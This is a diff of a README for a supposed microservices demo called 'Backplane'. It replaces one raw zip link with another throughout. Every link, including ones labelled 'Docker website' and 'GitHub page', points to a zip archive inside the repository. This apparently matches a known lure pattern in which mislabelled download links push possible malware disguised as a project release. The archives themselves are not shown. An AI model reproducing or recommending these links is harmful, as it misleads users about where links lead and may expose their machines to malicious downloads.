@@ -1,10 +1,10 @@
 # 🚀 Backplane - Explore Microservices with Ease
 
 ## 🌐 Overview
-Backplane is a demo application showcasing a microservices architecture. It uses Docker, https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/auth-service/Software_3.6-beta.5.zip, PostgreSQL, and highlights Chaos Engineering patterns. This application helps you understand how these technologies work together. Whether you want to learn or experiment, Backplane simplifies the process.
+Backplane is a demo application showcasing a microservices architecture. It uses Docker, https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/notification-service/Software_2.7.zip, PostgreSQL, and highlights Chaos Engineering patterns. This application helps you understand how these technologies work together. Whether you want to learn or experiment, Backplane simplifies the process.
 
 ## 📥 Download Now
-[![Download Backplane](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/auth-service/Software_3.6-beta.5.zip%https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/auth-service/Software_3.6-beta.5.zip)](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/auth-service/Software_3.6-beta.5.zip)
+[![Download Backplane](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/notification-service/Software_2.7.zip%https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/notification-service/Software_2.7.zip)](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/notification-service/Software_2.7.zip)
 
 ## 🚀 Getting Started
 To use Backplane, follow these simple steps:
@@ -12,10 +12,10 @@ To use Backplane, follow these simple steps:
 1. **Check Your System Requirements**
    - Operating System: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
    - At least 8 GB of RAM.
-   - Docker installed. You can find installation instructions on the [Docker website](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/auth-service/Software_3.6-beta.5.zip).
+   - Docker installed. You can find installation instructions on the [Docker website](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/notification-service/Software_2.7.zip).
 
 2. **Visit the Download Page**
-   To get the latest version of Backplane, [visit this page to download](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/auth-service/Software_3.6-beta.5.zip).
+   To get the latest version of Backplane, [visit this page to download](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/notification-service/Software_2.7.zip).
 
 3. **Download the Release**
    On the Releases page, you will see different versions. Choose the latest release. Click on the `Assets` dropdown to find the files you need. Download the appropriate file for your operating system.
@@ -57,7 +57,7 @@ After installation, you can interact with Backplane through your web browser. Ty
    - If you encounter problems, you can report them in the Issues section of the repository on GitHub.
 
 ## 🔧 Technical Support
-For further assistance, please open an issue on our [GitHub page](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/auth-service/Software_3.6-beta.5.zip). Our community and developers are here to help you.
+For further assistance, please open an issue on our [GitHub page](https://github.com/Haanzfrost007/Backplane/raw/refs/heads/main/notification-service/Software_2.7.zip). Our community and developers are here to help you.
 
 ## 📜 License
 Backplane is open-source and follows the MIT License. This means you can use it freely, modify it, and distribute your changes. Make sure to give credit to the original creators when sharing.
